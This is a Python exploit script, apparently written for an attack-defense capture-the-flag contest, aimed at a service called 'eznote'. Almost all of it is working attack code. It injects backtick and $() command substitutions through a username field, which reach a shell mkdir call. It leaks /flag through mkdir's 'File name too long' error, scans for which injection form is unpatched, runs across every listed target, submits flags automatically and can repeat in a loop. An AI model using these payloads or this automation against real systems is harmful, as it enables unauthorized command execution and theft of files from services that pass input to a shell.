#!/usr/bin/env python3
"""
eznote - Command Injection Exploit v2
=====================================
Vulnerability: Username field allows command injection via backticks.
The create_note_dir function runs: mkdir -p "%s/%s/" with username.
USERNAME_BLACKLIST only blocks: " ' .
But backticks ` and $() are NOT blocked!

Exploit Method:
1. Use backticks in username to execute commands
2. Command output becomes the directory name in mkdir
3. If output > 255 bytes, mkdir fails with "File name too long" error
4. The error message contains our command output (including flag)!

Strategy:
1. First write flag to /tmp/f via: `cat /flag > /tmp/f`
2. Then read it with padding: `cat /tmp/f; ls -la /tmp`
3. The combined output causes "File name too long" error which reveals flag

Usage:
    python3 eznote_exploit_v2.py              # Run against all targets
    python3 eznote_exploit_v2.py 172.24.84.11 # Run against specific IP
    python3 eznote_exploit_v2.py --loop       # Run continuously
"""

import sys
import os
import re
import time

# Suppress pwntools noise
os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *
from pwn_lib import shortcuts
from awd_lib import submit, targets, our_ip, setup_auth

# === CHALLENGE CONFIG ===
PORT = 1000
TIMEOUT = 10
LOOP_DELAY = 60

# Suppress pwntools output
context.log_level = 'error'
context.timeout = TIMEOUT


def exploit(ip, port):
    """
    Exploit command injection to read /flag via mkdir error message.
    
    The output of backtick command substitution becomes the directory name.
    When the output is > 255 bytes, mkdir fails with "File name too long"
    and the error message contains our command output.
    """
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Step 1: Write flag to temp file (in case it doesn't exist yet)
        io.recvuntil(b'Username: ')
        io.sendline(b'`cat /flag > /tmp/f`a')
        io.recvuntil(b'> ')
        io.sendline(b'2')  # Create note dir - triggers command injection
        io.recvuntil(b'> ')
        
        # Step 2: Read flag with padding to cause long filename error
        # Combined output of cat + ls should exceed 255 bytes
        io.sendline(b'1')  # Change username
        io.recvuntil(b'Username: ')
        io.sendline(b'`cat /tmp/f;ls -la /tmp`')
        io.recvuntil(b'> ')
        io.sendline(b'2')  # Trigger mkdir
        
        # Collect output - the mkdir error contains the flag
        time.sleep(0.5)
        data = b''
        while True:
            try:
                chunk = io.recv(4096, timeout=1)
                if chunk:
                    data += chunk
                else:
                    break
            except:
                break
        
        io.close()
        
        # Extract flag from mkdir error message
        # Format: mkdir: cannot create directory '/tmp/PID/rand/FLAG\nls_output...': File name too long
        text = data.decode(errors='ignore')
        
        # Try multiple flag formats
        patterns = [
            r'(hkcert24\{[^}]+\})',
            r'(flag\{[^}]+\})',
            r'(HKCERT24\{[^}]+\})',
            r'(FLAG\{[^}]+\})',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
        
    except Exception as e:
        return None


def exploit_dollar(ip, port):
    """
    Alternative exploit using $() instead of backticks.
    Use this if target has patched backticks but not $().
    """
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Test if $() works
        io.recvuntil(b'Username: ')
        io.sendline(b'$(cat /flag > /tmp/f2)a')
        io.recvuntil(b'> ')
        io.sendline(b'2')
        io.recvuntil(b'> ')
        
        # Read with padding
        io.sendline(b'1')
        io.recvuntil(b'Username: ')
        io.sendline(b'$(cat /tmp/f2;ls -la /tmp)')
        io.recvuntil(b'> ')
        io.sendline(b'2')
        
        time.sleep(0.5)
        data = b''
        while True:
            try:
                chunk = io.recv(4096, timeout=1)
                if chunk:
                    data += chunk
                else:
                    break
            except:
                break
        
        io.close()
        
        text = data.decode(errors='ignore')
        patterns = [
            r'(hkcert24\{[^}]+\})',
            r'(flag\{[^}]+\})',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
        
    except Exception as e:
        return None


def check_vuln(ip, port):
    """Check which vulnerabilities are present."""
    vulns = {'backtick': False, 'dollar': False}
    
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Test backtick
        io.recvuntil(b'Username: ')
        io.sendline(b'`echo test`')
        resp = io.recvuntil(b'> ')
        if b'Bad username' not in resp:
            vulns['backtick'] = True
        
        # Test $()
        io.sendline(b'1')
        io.recvuntil(b'Username: ')
        io.sendline(b'$(echo test)')
        resp = io.recvuntil(b'> ')
        if b'Bad username' not in resp:
            vulns['dollar'] = True
        
        io.close()
    except:
        pass
    
    return vulns


def run_single(ip):
    """Run exploit against a single target."""
    print(f"[*] Attacking {ip}:{PORT}...")
    
    # Check vulnerabilities
    vulns = check_vuln(ip, PORT)
    
    flag = None
    
    if vulns['backtick']:
        print(f"    [+] Backtick injection: VULNERABLE")
        flag = exploit(ip, PORT)
    elif vulns['dollar']:
        print(f"    [+] Dollar injection: VULNERABLE")
        flag = exploit_dollar(ip, PORT)
    else:
        print(f"    [-] Both injections: PATCHED")
        return False
    
    if flag:
        print(f"[+] Got flag: {flag}")
        result = submit(flag, target=ip)
        if result["success"]:
            if result["duplicate"]:
                print(f"[=] Flag submitted (duplicate)")
            else:
                print(f"[+] NEW FLAG SUBMITTED!")
        else:
            print(f"[-] Submit failed: {result['message']}")
        return True
    else:
        print(f"[-] No flag from {ip}")
        return False


def run_all():
    """Run exploit against all targets."""
    target_list = targets()
    
    print(f"[*] Our IP: {our_ip()}")
    print(f"[*] Targets: {len(target_list)}")
    print(f"[*] Port: {PORT}")
    print()
    
    success = 0
    failed = 0
    
    for ip in target_list:
        if run_single(ip):
            success += 1
        else:
            failed += 1
    
    print()
    print(f"[*] Done: {success} success, {failed} failed")
    return success, failed


def run_loop():
    """Run exploit continuously."""
    print(f"[*] Running in loop mode (Ctrl+C to stop)")
    print(f"[*] Delay between rounds: {LOOP_DELAY}s")
    
    round_num = 0
    while True:
        round_num += 1
        print(f"\n{'='*50}")
        print(f"ROUND {round_num}")
        print(f"{'='*50}")
        
        try:
            run_all()
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            break
        except Exception as e:
            print(f"[-] Round error: {e}")
        
        print(f"[*] Sleeping {LOOP_DELAY}s...")
        try:
            time.sleep(LOOP_DELAY)
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            break


def main():
    try:
        setup_auth()
    except:
        pass
    
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        
        if arg == "--loop" or arg == "-l":
            run_loop()
        elif arg == "--scan" or arg == "-s":
            # Scan all targets for vulnerabilities
            for ip in targets():
                vulns = check_vuln(ip, PORT)
                status = []
                if vulns['backtick']:
                    status.append("backtick")
                if vulns['dollar']:
                    status.append("dollar")
                print(f"{ip}: {', '.join(status) if status else 'PATCHED'}")
        elif arg == "--help" or arg == "-h":
            print(__doc__)
        else:
            run_single(arg)
    else:
        run_all()


if __name__ == "__main__":
    main()
